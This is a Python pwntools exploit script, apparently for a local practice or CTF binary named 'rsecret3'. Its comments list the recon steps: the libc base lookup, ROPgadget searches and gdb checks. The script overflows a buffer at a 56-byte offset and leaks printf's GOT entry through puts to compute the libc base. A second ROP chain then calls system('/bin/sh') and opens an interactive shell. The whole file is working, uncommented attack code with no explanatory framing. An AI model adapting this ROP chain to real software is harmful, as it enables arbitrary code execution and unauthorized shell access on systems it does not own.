#!/usr/bin/python3

# ldd {vuln} -> /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dcb000)
# ps -aux | grep {vuln}
# cat /proc/{pid}/maps
# libc base address: 0x00007ffff7dcb000
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret" -> 0x0000000000027c65
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "/bin/sh" -> 0x000000000019604f
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts -> 0x0000000000075b00

# check address:
# xxd -l 8 /lib/x86_64-linux-gnu/libc.so.6
# (gdb) x/2x 0x7ffff7dcb000
# (gdb) x/x 0x7ffff7df2c65 -> 0x0f66c35f
# (gdb) x/x 0x7ffff7f6104f -> 0x6e69622f
# (gdb) x/x 0x7ffff7f61053 -> 0x0068732f
# (gdb) x/x 0x7ffff7e40b00

from pwn import *
from pprint import pprint

test_stage = 1
exploit_stage = 2

target = ["./rsecret3"]
offset = 56

context.arch = "amd64"
context.update(os = "linux")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

elf = ELF(target[0])
pprint(elf.symbols)

rop = ROP(elf)

rop_libc = ROP(libc)

BIN_SH = next(elf.search(b"/bin/sh\x00"))
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
POP_RDI_LIBC = rop_libc.find_gadget(["pop rdi", "ret"])[0]
PRINTF_GOT = elf.got["printf"]
PUTS_PLT = elf.plt["puts"]
SYSTEM_PLT = elf.plt["system"]
SYSTEM_LIBC = libc.symbols["system"]

print("-" * 100)
print("/bin/sh string offset: " + hex(BIN_SH))
print("pop rdi gadget offset: " + hex(POP_RDI))
print("pop rdi gadget@libc offset: " + hex(POP_RDI_LIBC))
print("printf@got: " + hex(PRINTF_GOT))
print("puts@plt: " + hex(PUTS_PLT))
print("system@plt: " + hex(SYSTEM_PLT))
print("system@libc offset: " + hex(SYSTEM_LIBC))
print("-" * 100)

# defaults only
# libc_base = 0x7ffff7dcb000
# pop_rdi = libc_base + POP_RDI_LIBC
# system_libc = libc_base + SYSTEM_LIBC

def main():
    test()
    exploit()

def test():
    rop_leak = p64(POP_RDI) + p64(PRINTF_GOT) + p64(PUTS_PLT)
    rop.call(elf.symbols["main"])
    test = [
        b"A" * offset,
        rop_leak,
        rop.chain()
    ]
    payload = b"".join(test)
    inject(payload, test_stage)

def exploit():
    rop_leak = p64(POP_RDI) + p64(BIN_SH) + p64(PUTS_PLT)
    rop_exec = p64(POP_RDI) + p64(BIN_SH) + p64(SYSTEM_PLT)
    exploit = [
        b"A" * offset,
        rop_leak,
        rop_exec
    ]
    payload = b"".join(exploit)
    inject(payload, exploit_stage)

def inject(payload, stage):
    global libc_base
    global pop_rdi
    global system_libc

    p = process(target)
    p.recvuntil("\n")
    p.sendline(payload)
    if stage == test_stage:
        p.recvuntil("key")
        received = p.recvline().rstrip()
        leaked = u64(received.ljust(8, b"\x00"))
        libc_base = leaked - libc.symbols["printf"]
        pop_rdi = libc_base + POP_RDI_LIBC
        system_libc = libc_base + SYSTEM_LIBC
        print("-" * 100)
        print("leaked address: " + hex(leaked))
        print("calculated libc base address: " + hex(libc_base))
        print("calculated system call address: " + hex(system_libc))
        print("-" * 100)
    if stage == exploit_stage:
        p.recvuntil("\n")
        p.interactive()

if __name__ == "__main__":
    main()
